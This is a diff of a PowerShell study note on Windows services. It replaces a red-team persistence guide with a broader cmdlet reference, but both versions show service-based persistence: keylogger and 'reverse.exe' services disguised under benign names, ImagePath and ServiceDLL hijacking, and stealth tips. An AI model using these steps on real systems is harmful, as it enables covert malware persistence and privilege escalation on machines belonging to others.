@@ -1,143 +1,206 @@
-                WHAT ARE WINDOWS SERVICES?
-            ---------------------------------------------------------------------------------
-    Services are background processes that start before or right after login.
+                    WINDOWS SERVICES
+                =======================
+- Services in Windows are background processes managed by the Service Control Manager (SCM).  
+- PowerShell lets you query, start, stop, configure, and monitor them — all with scriptable precision.
 
-    They can run as:
 
-        LocalSystem (almost god-mode SYSTEM)
+        KEY COMMANDS.
+    ---------------------
+| Task                  | Cmdlet                           |
+|------------------------|---------------------------------|
+| View all services      | Get-Service                     |
+| View one service       | Get-Service -Name <name>        |
+| Start a service        | Start-Service -Name <name>      |
+| Stop a service         | Stop-Service -Name <name>       |
+| Restart a service      | Restart-Service -Name <name>    |
+| Change config          | Set-Service -Name <name> ...    |
+| Create new service     | New-Service                     |
+| Delete service         | ❌ Not native (use `sc.exe`)   |
 
-        NetworkService (low-priv, but network-focused)
+- They can run as:
+    > LocalSystem (almost god-mode SYSTEM)
+    > NetworkService (low-priv, but network-focused)
+    > LocalService (least privilege)
 
-        LocalService (least privilege)
+    | Account Type     | Description                               |
+    | ---------------- | ----------------------------------------- |
+    | `LocalSystem`    | High-privilege (almost god-mode SYSTEM)   |
+    | `NetworkService` | Low-priv, but can authenticate to network |
+    | `LocalService`   | Least privilege, no network creds         |
+    | **Custom User**  | Often domain users in corp setups         |
 
-    You manage them with tools like:
 
-        services.msc
+    > You manage them with tools like:
+        I. services.msc
+        II. sc.exe
+        III. PowerShell: New-Service, Set-Service, Start-Service, etc.
+        IV. Get-WmiObject Win32_Service      # Full object output
+        V. Get-CimInstance Win32_Service    # Modern version of above
 
-        sc.exe
+        | Tool                                | Use                                                             |
+        | ----------------------------------- | --------------------------------------------------------------- |
+        | `services.msc`                      | GUI viewer and manager                                          |
+        | `sc.exe`                            | Native service CLI (legacy but powerful)                        |
+        | PowerShell Cmdlets                  | Full control: `Get-Service`, `Set-Service`, `New-Service`, etc. |
+        | `Get-WmiObject` / `Get-CimInstance` | For deep info: path, user, state                                |
 
-        PowerShell: New-Service, Set-Service, Start-Service, etc.
 
-🧠 WHY SERVICES MATTER IN PERSISTENCE
+        WHY SERVICES MATTER IN PERSISTENCE
+    -------------------------------------------
+1. Start before user logs in
+2. Can run with no UI
+3. SYSTEM by default if misconfigured
+4. Persist through reboots
+5. Often overlooked unless you're actively hunting
+6. Combine service abuse with valid signing certificates or LOLBins (e.g. rundll32) for stealthier execution.
 
-    Start before user logs in
+        
+        COMMON RED TEAM ABUSES (AND LEGIT USE CASES)
+    ---------------------------------------------------
+|   Technique                              |    Description                                                 |
+|------------------------------------------|----------------------------------------------------------------|
+|Install new service	                   | Drop EXE, register as service = stealthy boot persistence      |
+|Hijack existing service	               | Change the ImagePath in registry to point to your binary       |
+|Replace ServiceDLL	For DLL-based services | drop malicious DLL                                             |
+|Set to autostart	StartType              | Auto means it starts with Windows                              |
+|Abuse binPath=                            | to execute cmd.exe	Like: cmd.exe /c calc.exe to sneak execution|
 
-    Can run with no UI
 
-    SYSTEM by default if misconfigured
+            USAGE.
+        ------------
+1. Viewing Services.
+    List all services with status.
+        EG.
+            Get-Service 
 
-    Persist through reboots
+    Filter services by status.
+        EG.
+            Get-Service | Where-Object {$_.Status -eq "Running" }
 
-    Often overlooked unless you're actively hunting
+    Show services details.
+        EG.
+            Get-Service -Name "wuauserv" | Format-List *
 
-🔥 COMMON RED TEAM ABUSES (AND LEGIT USE CASES)
-Technique	Description
-Install new service	Drop EXE, register as service = stealthy boot persistence
-Hijack existing service	Change the ImagePath in registry to point to your binary
-Replace ServiceDLL	For DLL-based services — drop malicious DLL
-Set to autostart	StartType = Auto means it starts with Windows
-Abuse binPath= to execute cmd.exe	Like: cmd.exe /c calc.exe to sneak execution
-✅ EXAMPLE: Create A New Service via PowerShell
+    Get all auto-start services.
+        EG.
+            Get-WmiObject -Class Win32_Service | Where-Object { $_.StartMode -eq "Auto" }
 
-Imagine you have this script at C:\logger\keylogger.exe
 
-New-Service -Name "SysHealthMonitor" `
-            -BinaryPathName "C:\logger\keylogger.exe" `
-            -DisplayName "System Health Monitor" `
-            -Description "Monitors internal health checks" `
-            -StartupType Automatic
+2. Start / Stop / Restart Services.
+    Start a service.
+        EG.
+            Start-Service -Name "Spooler"
 
-    🧠 This creates a stealthy service called "System Health Monitor" that executes your logger silently at boot.
+    Stop a service.
+        EG.
+            Stop-Service -Name "Spooler"
 
-To start it:
+    Restart service (with wait)
+        EG.
+            Restart-Service -Name "wuauserv" -Force -ErrorAction Stop
 
-Start-Service -Name "SysHealthMonitor"
+    Wait for service to stop.
+        EG.
+            Stop-Service -Name "BITS"
+            Get-Service -Name "BITS" | Where-Object { $_.Status -eq "Stopped" }
 
-🩸 Abusing Existing Service via Registry
 
-    Find a service:
+3. Modify service properties.
+    Set service to manual start.
+        EG.
+            Set-Service -Name "wuauserv" -StartupType Manual
 
-Get-Service | Where-Object {$_.Status -eq "Stopped"}
+    Set to disabled.
+        EG.
+            Set-Service -Name "Spooler" -StartupType Disabled
 
-    Note its Name, e.g., "Fax"
+    Set to auto start.
+        EG.
+            Set-Service -Name "Spooler" -StartupType Automatic
 
-    Go to:
 
-HKLM:\System\CurrentControlSet\Services\Fax
+4. Create / Remove services.
+    Create a new service (e.g. to persist script)
+        EG.
+            (you have a script at C:\Tools\my.exe)
+            New-Service -Name "MyService" -BinaryPathName "C:\Tools\my.exe" -DisplayName "My Cool Service" -Description "Monitors internal health checks" -StartupType Automatic
 
-    Change ImagePath:
+    Remove a service using sc.exe 
+        EG.
+            sc.exe delete MyService # Reliable everywhere.
+            Remove-Service -Name "SysHealthMonitor" # only in PS 6+
 
-Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\Fax" -Name "ImagePath" -Value "C:\logger\keylogger.exe"
+    Replace or hijack existing service.
+        EG.
+            Set-Service -Name "wuauserv" -BinaryPathName "C:\Tools\evil.exe" 
+            # Dangerous - only for lab use.
 
-    Now every time the Fax service is started, it launches your payload instead 💀
 
-🧪 DLL-Based Services
+5. Advanced : WMI + CIM Service Management.
+    Query full service info (with executable path)
+        EG.
+            Get-WmiObject -Class Win32_Service | Select-Object Name, State, StartMode, PathName
 
-Some services use DLLs instead of EXEs.
+    Stop a service via WMI.
+        EG.
+            (Get-WmiObject -Class Win32_Service -Filter "Name='Spooler'").StopService()
 
-    Look for ServiceDll inside:
+    Start via CIM (modern)
+        EG.
+            Invoke-CimMethod -ClassName Win32_Service -MethodName StartService -Arguments @{ Name = "BITS" }
 
-    HKLM\SYSTEM\CurrentControlSet\Services\SomeService\Parameters
 
-    You can:
+6. SECURITY / PERSISTENCE / AUDIT
+    Detect suspicious autostart services
+        EG.
+            Get-WmiObject -Class Win32_Service | Where-Object { $_.StartMode -eq "Auto" -and $_.PathName -like "*AppData*" }
 
-        Replace the DLL with a malicious one
+    Search for non-Microsoft services
+        EG.
+            Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike "*Windows*" }
 
-        Or edit the path in the registry to point to your .dll
+    Audit all service executables
+        EG
+            Get-WmiObject Win32_Service | Select-Object Name, PathName | Out-File C:\Audit\services.txt
 
-📍 Detecting Suspicious Services
 
-Blue teams or IR folks look at:
+7. Writable Registry keys -> Hijack ImagePath.
+    - If you have permission to modify the service registry key, you can change the path to the service executable (ImagePath) to point to your own binary.
+        
+        I. Find service.
+            EG.
+                Get-Service | Where-Object { $_.Status -eq "Stopped" }
 
-    Non-Microsoft executables in System32
+        II. View its registry path.
+            EG.
+                "HKLM:\SYSTEM\CurrentControlSet\Services\$($svc.Name)"
 
-    Weird ImagePath like cmd /c something
+        III. Replace the binary.
+            EG.
+                Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Fax" -Name "ImagePath" -Value "C:\Users\Public\reverse.exe"
 
-    Suspicious service names like UpdateTasker or DriverSupport
+        Then:
+            EG.
+                Start-Service Fax 
+                
 
-    Get-WmiObject win32_service | select Name, StartName, PathName
+8. REAL-WORLD USE CASES
+    Restart service if it's stuck
+        EG
+            $s = Get-Service "Spooler"
+            if ($s.Status -ne "Running") {
+                Restart-Service "Spooler"
+            }
+    
+    Mass disable telemetry services
+        EG.
+            $services = "DiagTrack", "dmwappushservice"
+            foreach ($svc in $services) {
+                Set-Service -Name $svc -StartupType Disabled
+                Stop-Service -Name $svc -Force
+            }
 
-👮 Service Privilege Escalation (Privesc)
+     Dump all service configs for backup/audit
+        EG
+            Get-WmiObject Win32_Service | Export-Csv "C:\services_backup.csv" -NoTypeInformation
 
-Even if a service isn’t SYSTEM, you can abuse it if:
-
-    The binary is writable by your user → Replace it with yours
-
-    The service can be stopped/started by your user
-
-    The registry keys are writable → Change config to execute something else
-
-Tools like:
-
-    PowerUp
-
-    AccessChk
-
-    WinPEAS
-    can enumerate all weak service permissions.
-
-🔥 Pro Moves
-
-    Change StartType to Auto so your malware loads on boot:
-
-Set-Service -Name "SysHealthMonitor" -StartupType Automatic
-
-    Set Recovery to Relaunch on Failure (stealth persistence):
-
-sc.exe failure SysHealthMonitor reset= 0 actions= restart/5000
-
-🧼 Clean Up
-
-To remove:
-
-Stop-Service -Name "SysHealthMonitor"
-Remove-Service -Name "SysHealthMonitor"
-
-If registry-hijacked, reset ImagePath to original binary.
-💣 Final Warnings
-
-    Services are a goldmine for persistence, but abusing SYSTEM-level services is loud if not hidden well.
-
-    Combine this with obfuscated binaries and hidden folders for stealth.
-
-    You’ll often chain services with ScheduledTasks or registry for multi-layer persistence (harder to clean).
